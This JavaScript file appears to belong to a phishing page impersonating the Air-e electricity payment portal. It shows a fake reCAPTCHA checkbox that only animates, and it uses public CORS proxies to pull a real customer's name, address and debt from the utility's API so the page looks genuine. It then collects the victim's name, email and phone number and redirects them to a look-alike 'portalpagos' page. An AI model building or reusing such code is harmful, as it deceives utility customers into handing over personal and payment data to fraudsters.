// --- 1. LÓGICA DE MENÚ ---
const hamburgerBtn = document.getElementById('hamburgerBtn');
const hamburgerBtnDesktop = document.getElementById('hamburgerBtnDesktop'); 
const sidebar = document.getElementById('sidebar');

const toggleSidebar = () => {
    if (window.innerWidth <= 768) sidebar.classList.toggle('mobile-open');
    else sidebar.classList.toggle('hidden');
};

if(hamburgerBtn) hamburgerBtn.addEventListener('click', toggleSidebar);
if(hamburgerBtnDesktop) hamburgerBtnDesktop.addEventListener('click', toggleSidebar);

// --- 2. LÓGICA DE RECAPTCHA ---
const checkboxContainer = document.getElementById('checkboxContainer');
const fakeCheckbox = document.getElementById('fakeCheckbox');
const spinner = document.getElementById('spinner');
const checkmark = document.getElementById('checkmark');
let isChecked = false;

if(checkboxContainer){
    checkboxContainer.addEventListener('click', () => {
        if(isChecked) return; 
        fakeCheckbox.style.display = 'none';
        spinner.style.display = 'block';
        setTimeout(() => {
            spinner.style.display = 'none';
            checkmark.style.display = 'block';
            isChecked = true;
        }, 1200);
    });
}

// --- 3. LÓGICA DE CONSULTA (MULTÍ-PROXY PARA RENDER) ---
const btnPagar = document.getElementById('btnPagar');
const whitePanel = document.getElementById('whitePanel');
const originalTitleStrip = document.getElementById('originalTitleStrip');
const inputNic = document.getElementById('inputNicReal');

if(btnPagar) {
    btnPagar.addEventListener('click', async () => {
        const nic = inputNic.value.trim();
        if(!nic) { alert("Por favor, ingrese el NIC."); return; }
        if(!isChecked) { alert("Por favor confirme que no es un robot."); return; }

        originalTitleStrip.style.display = 'none';
        whitePanel.innerHTML = `
            <div class="full-loader-container">
                <div class="big-loader"></div>
                <p>Consultando deuda en Air-e...</p>
            </div>`;

        const targetUrl = `https://caribesol.facture.co/DesktopModules/Gateway.Pago.ConsultaAnonima/API/ConsultaAnonima/getPolizaOpen?cd_poliza=${nic}`;
        
        // Intentar con varios proxies si uno falla (especialmente útil en Render)
        const proxies = [
            `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}&t=${Date.now()}`,
            `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`,
            `https://corsproxy.io/?${encodeURIComponent(targetUrl)}`
        ];

        let finalData = null;

        for (let p of proxies) {
            try {
                const response = await fetch(p);
                if (!response.ok) continue;
                const json = await response.json();
                
                // Normalizar respuesta
                let raw = json.contents ? json.contents : json;
                let parsed = (typeof raw === 'string') ? JSON.parse(raw) : raw;

                if (parsed && (parsed.ACCOUNTS || parsed.NAME)) {
                    finalData = parsed;
                    break;
                }
            } catch (e) { console.error("Fallo proxy:", p); }
        }

        if (!finalData) {
            alert("Error de conexión. El servidor de Air-e no responde. Intenta de nuevo.");
            location.reload();
            return;
        }

        const info = finalData.ACCOUNTS || finalData;
        const deudaTotalNum = parseFloat(info.ADJUST_BALANCE) || 0;
        const nombreUsuario = finalData.NAME || info.NAME || "USUARIO AIR-E";
        
        let valorMesNum = 0;
        if (info.INVOICES && info.INVOICES.length > 0) {
            valorMesNum = parseFloat(info.INVOICES[info.INVOICES.length - 1].ADJUST_BALANCE) || 0;
        }

        // --- MOSTRAR RESULTADOS Y FORMULARIO ---
        whitePanel.innerHTML = `
        <div class="invoice-view">
            <div class="invoice-header"><h3>PAGUE SU FACTURA</h3></div>
            <div style="text-align:center; padding:10px; background:#f0f4f8; margin-bottom:15px; border-radius:5px;">
                <strong style="display:block; color:#004a99; text-transform:uppercase;">${nombreUsuario}</strong>
                <small>${info.COLLECTION_ADDRESS || 'Dirección de suministro'}</small>
            </div>
            
            <div class="invoice-form-grid">
                <div class="required-note">* Indica campo requerido</div>
                <div class="invoice-input-group">
                    <label class="invoice-label">No. identificación / NIC <span>*</span></label>
                    <input type="text" class="invoice-field" id="numId" value="${nic}" readonly>
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Nombres <span>*</span></label>
                    <input type="text" class="invoice-field" id="nombres" placeholder="Ej: Juan">
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Apellidos <span>*</span></label>
                    <input type="text" class="invoice-field" id="apellidos" placeholder="Ej: Perez">
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Correo <span>*</span></label>
                    <input type="email" class="invoice-field" id="correo" placeholder="correo@ejemplo.com">
                </div>
                <div class="invoice-input-group">
                    <label class="invoice-label">Celular <span>*</span></label>
                    <input type="text" class="invoice-field" id="celular" placeholder="3001234567">
                </div>
                <input type="hidden" id="direccion" value="${info.COLLECTION_ADDRESS || ''}">
            </div>

            <div class="payment-cards-grid">
                <div class="payment-card">
                    <div class="pay-card-title">Valor del mes</div>
                    <div class="pay-card-amount">$ ${valorMesNum.toLocaleString('es-CO')}</div>
                    <button class="btn-card-action btn-blue-dark" onclick="guardarYRedirigir('${valorMesNum}', 'mensual')">PAGAR MES</button>
                </div>
                <div class="payment-card">
                    <div class="pay-card-title">Deuda Total</div>
                    <div class="pay-card-amount" style="color:#d32f2f;">$ ${deudaTotalNum.toLocaleString('es-CO')}</div>
                    <button class="btn-card-action btn-teal" onclick="guardarYRedirigir('${deudaTotalNum}', 'total')">PAGAR TOTAL</button>
                </div>
            </div>

            <div class="invoice-footer">
                <div class="terms-check">
                    <input type="checkbox" id="checkTerm" checked>
                    <span>Acepto políticas de tratamiento de datos personales.</span>
                </div>
                <button class="btn-cancel" onclick="location.reload()">VOLVER</button>
            </div>
        </div>`;
    });
}

// --- 4. FUNCIÓN PARA PASAR DATOS A LA SIGUIENTE PÁGINA ---
window.guardarYRedirigir = function(monto, tipo) {
    const nom = document.getElementById('nombres').value.trim();
    const ape = document.getElementById('apellidos').value.trim();
    const mail = document.getElementById('correo').value.trim();
    const cel = document.getElementById('celular').value.trim();
    const term = document.getElementById('checkTerm');

    if(!nom || !ape || !mail || !cel) {
        alert("Por favor, complete todos los campos (Nombres, Apellidos, Correo y Celular).");
        return;
    }
    if(!term.checked) {
        alert("Debe aceptar los términos.");
        return;
    }

    // Estructura exacta de datos para la página portalpagos
    const datosFactura = {
        nombreCompleto: nom + " " + ape,
        numId: document.getElementById('numId').value,
        correo: mail,
        celular: cel,
        direccion: document.getElementById('direccion').value,
        montoPagar: parseInt(monto),
        tipoPago: tipo, // 'mensual' o 'total'
        referencia: "AIR" + Math.floor(Math.random() * 900000 + 100000),
        fecha: new Date().toLocaleDateString()
    };
    
    // Guardamos en el local storage
    localStorage.setItem('datosFactura', JSON.stringify(datosFactura));
    
    // Redirigimos
    window.location.href = 'portalpagos.portalfacture.com.html';
};
